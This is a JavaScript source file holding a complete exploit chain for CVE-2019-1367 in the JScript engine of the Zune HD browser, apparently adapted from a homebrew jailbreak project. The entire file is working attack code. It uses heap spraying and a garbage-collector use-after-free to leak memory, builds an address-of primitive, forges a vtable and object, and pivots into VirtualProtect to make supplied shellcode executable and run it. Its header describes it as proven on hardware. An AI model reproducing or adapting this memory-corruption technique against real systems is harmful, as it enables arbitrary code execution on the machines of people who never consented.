/* CVE-2019-1367 against ZIE's JScript on Zune HD v4.5, derived from the browser
 * entrypoint in zuneslayer by CUB3D. Kept verbatim apart from the entry point.
 * Nothing here is dead: the chain is heap-sensitive and this is the form proven on
 * hardware. run() returns null on success and does not return once the shellcode
 * takes over; any other value names the stage that gave up, and both the leak and
 * the trigger are races, so the caller retries.
 */

var LyraChain = (function () {

    var gbl_leak_offset = 0x00011b80;
    var flag = false;
    var leak_str = "";


    var spray2 = new Array();
    var spray = new Array();
    var test1 = new Array(700>>3).join("\u0000\u0000\u0008\u0000\u0000\u0000\u1b80\u0001");

    function dwordFromStr(str, index) {
        var cc1 = String.prototype.charCodeAt.call(str, index);
        var cc2 = String.prototype.charCodeAt.call(str, index + 1);
        return cc1 + cc2 * 65536;
    }

    function setup_leak() {

        var cnt = 6000;
        var cnt2 = 500;

        function F() {

            for (var i = 0; i < cnt2; i++) spray2[i] = new Object();

            // 2. Create a bunch of objects
            for (var i = 0; i < cnt; i++) {
                spray[i] = new Object();
            }

            // 3. Store a reference to one of them in the arguments array
            //    The arguments array isn't tracked by garbage collector
            arguments[0] = spray[300];

            // 4. Delete the objects and call the garbage collector
            //    All JSCript variables get reclaimed...
            for (var i = 0; i < cnt; i++) spray[i] = 1;
            CollectGarbage();

            for (var i = 0; i < cnt2; i++) {
                spray2[i][test1] = 1;
            }

            var x = arguments[0];

            var y = typeof x;
            if (y === "string") {
                flag = true;
                leak_str = x;
            }

            return 0;
        }

        // 1. Call sort with a custom callback
        [1, 2].sort(F);

    }

    var spray2_1 = new Array();
    var spray_1 = new Array();
    var test1_1 = null;

    function exe() {
        var cnt = 6000;
        var cnt2 = 500;

        function F() {

            CollectGarbage();

            for (var i = 0; i < cnt2; i++) spray2_1[i] = new Object();

            // 2. Create a bunch of objects
            for (var i = 0; i < cnt; i++) {
                spray_1[i] = new Object();
            }

            // 3. Store a reference to one of them in the arguments array
            //    The arguments array isn't tracked by garbage collector
            arguments[0] = spray_1[300];

            // 4. Delete the objects and call the garbage collector
            //    All JSCript variables get reclaimed...
            for (var i = 0; i < cnt; i++) spray_1[i] = 1;
            CollectGarbage();

            for (var i = 0; i < cnt2; i++) {
                spray2_1[i][test1_1] = 1;
            }

            var x = arguments[0];

            var y = typeof x;
            if (y != "undefined") {
                flag = true;
            }

            return 0;
        }

        // 1. Call sort with a custom callback
        [1, 2].sort(F);
    }

    function read_var(ptr) {
           var ty = dwordFromStr(leak_str, ((ptr + 0x0 - gbl_leak_offset) >> 1)) & 0xFF;
           var val_hi = dwordFromStr(leak_str, ((ptr + 0x4 - gbl_leak_offset) >> 1));
           var val_lo = dwordFromStr(leak_str, ((ptr + 0x8 - gbl_leak_offset) >> 1));
           var _unused = dwordFromStr(leak_str, ((ptr + 0xc - gbl_leak_offset) >> 1));

           return {
               ty: ty,
               val_hi: val_hi,
               val_lo: val_lo,
               _unused: _unused
           };
       }

    function read_iscavengerbase(ptr) {
           var scav_vtbl = dwordFromStr(leak_str, ((ptr + 0x0 - gbl_leak_offset) >> 1));
           var scav_next_ptr = dwordFromStr(leak_str, ((ptr + 0xc - gbl_leak_offset) >> 1));
           var scav_prev = dwordFromStr(leak_str, ((ptr + 0x8 - gbl_leak_offset) >> 1));

           var scav_next = dwordFromStr(leak_str, ((scav_next_ptr - gbl_leak_offset) >> 1));

           var type = "Unk";
           var obj = {};

           if (scav_vtbl === 0x40e946d0) {
               type = "nameTbl";
           } else if (scav_vtbl === 0x40e92344) {
               type = "ScavVarList";
               var scav_buf = dwordFromStr(leak_str, ((ptr + 0x10 - gbl_leak_offset) >> 1));
               var scav_count = dwordFromStr(leak_str, ((ptr + 0x14 - gbl_leak_offset) >> 1));

               obj.buf = scav_buf;
               obj.count = scav_count;

               obj.elems = [];
               for (var i = 0; i < scav_count; i++) {
                   obj.elems.push(read_var(scav_buf + 0x8 + 0x20 * i));
               }
           } else if (scav_vtbl === 0x40e9231c) {
               type = "VarStack";
           }

           return {
               vtbl: scav_vtbl,
               type: type,
               next: scav_next,
               prev: scav_prev,
               obj: obj
           };
       }

    function addr_of(target_str) {
           var leak_val = "";

           function ff(first, second) {
               if (!(first === 0x1337 && second === 0x1337)) {
                   return 0;
               }

               document.tls = dwordFromStr(leak_str, ((0x40f3bfd4 - gbl_leak_offset) >> 1));

               document.gc = dwordFromStr(leak_str, ((document.tls + 0x14 - gbl_leak_offset) >> 1));

               document.gc_scavengers = dwordFromStr(leak_str, ((document.gc + 0x18 - gbl_leak_offset) >> 1));

               var scav = read_iscavengerbase(document.gc_scavengers);
               while (true) {

                   if (scav.type === "ScavVarList") {
                       if (scav.obj.count === 4) {
                           if (scav.obj.elems[0].ty === 0x80) {
                               var vvar_var = read_var(scav.obj.elems[0].val_lo);

                               if (vvar_var.ty === 0x8) {
                                   leak_val = vvar_var.val_lo;

                                   break;

                               }

                           }
                       }
                   }

                   if (scav.prev === 0) {
                       break;
                   }

                   scav = read_iscavengerbase(scav.prev);
               }

               return 0;
           }

           [target_str, 0x81828384, 0x1337, 0x1337].sort(ff);

           return leak_val;
       }

    function run(shellcode, note) {
        var i;

        note("leak");
        flag = false;
        for (i = 0; i < 15; i++) {
            CollectGarbage();
            try { setup_leak(); } catch (e) { }
            if (flag) { break; }
            CollectGarbage();
        }
        if (!flag) { return "leak"; }

        note("locate");
        var fake_stack = "";
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack += String.fromCharCode(1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1, 1,1);
        fake_stack = fake_stack.substr(0, fake_stack.length);
        var fake_stack_addr = addr_of(fake_stack);
        if (!fake_stack_addr) { return "locate"; }

        var shellcode_sz = shellcode.length;
        shellcode = shellcode.substr(0, shellcode.length);
        var shellcode_addr = addr_of(shellcode);
        if (!shellcode_addr) { return "locate"; }

        var tgt_func = 0x4035a514; // all regs

            var fake_vtable = "";
            for(var i = 0; i < 20; i++) {
                fake_vtable += "AA";
            }
            for(var i = 0; i < 19; i++) {
                fake_vtable += "BB";
            }
            fake_vtable += String.fromCharCode((tgt_func) & 0xFFFF); // +0x9c
            fake_vtable += String.fromCharCode(((tgt_func) & 0xFFFF0000)>>16);

            fake_vtable = fake_vtable.substr(0, fake_vtable.length);
            var fake_vtable_addr = addr_of(fake_vtable);

            /* TL;DR: call ldmia {every reg} gadget, setting r0-r3 + pc to VirtualProtect(str, RWX, 1, <out>), and return from that to string*/

            var fake_object = "";
            // our fake vtable
            fake_object += String.fromCharCode((fake_vtable_addr) & 0xFFFF);
            fake_object += String.fromCharCode(((fake_vtable_addr) & 0xFFFF0000)>>16);

            // args for pivot
            // VirtualProtect arg0 - arg4
            fake_object += String.fromCharCode((shellcode_addr) & 0xFFFF); // addr
            fake_object += String.fromCharCode(((shellcode_addr) & 0xFFFF0000)>>16);
            fake_object += String.fromCharCode(shellcode_sz & 0xFFFF); // sz
            fake_object += String.fromCharCode((shellcode_sz & 0xFFFF0000)>>16);
            fake_object += String.fromCharCode(0x40 & 0xFFFF); // prot
            fake_object += String.fromCharCode((0x40 & 0xFFFF0000)>>16);
            // output to some random RW mem
            fake_object += String.fromCharCode((0x40f37010) & 0xFFFF); // out
            fake_object += String.fromCharCode(((0x40f37010) & 0xFFFF0000)>>16);

            // padding for pivot
            fake_object += String.fromCharCode(0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0);
            // sp
            fake_object += String.fromCharCode((fake_stack_addr+128) & 0xFFFF);
            fake_object += String.fromCharCode(((fake_stack_addr+128) & 0xFFFF0000)>>16);
            // lr
            fake_object += String.fromCharCode((shellcode_addr) & 0xFFFF);
            fake_object += String.fromCharCode(((shellcode_addr) & 0xFFFF0000)>>16);
            // pc (virtual protect)
            fake_object += String.fromCharCode((0x40332b88) & 0xFFFF);
            fake_object += String.fromCharCode(((0x40332b88) & 0xFFFF0000)>>16);

            fake_object = fake_object.substr(0, fake_object.length);
            var fake_obj_address = addr_of(fake_object);

            var fake_var = "";
            fake_var += "\u0000\u0000"; // idk
            fake_var += "\u0081"; // ty
            fake_var += "\u0000"; // pad
            fake_var += "\u0000\u0000"; // hi
            fake_var += String.fromCharCode(fake_obj_address & 0xFFFF); //lo
            fake_var += String.fromCharCode((fake_obj_address & 0xFFFF0000)>>16);
            fake_var = fake_var.substr(0, fake_var.length);
            var fake_var_address = addr_of(fake_var);

        test1_1 = new Array(700>>3).join(fake_var);

        note("groom");
        for (i = 0; i < 100; i++) {
            CollectGarbage();
        }

        note("fire");
        flag = false;
        for (i = 0; i < 40; i++) {
            CollectGarbage();
            try { exe(); } catch (e) { }
            if (flag) { break; }
            CollectGarbage();
        }
        return flag ? null : "fire";
    }

    return { run: run };
})();
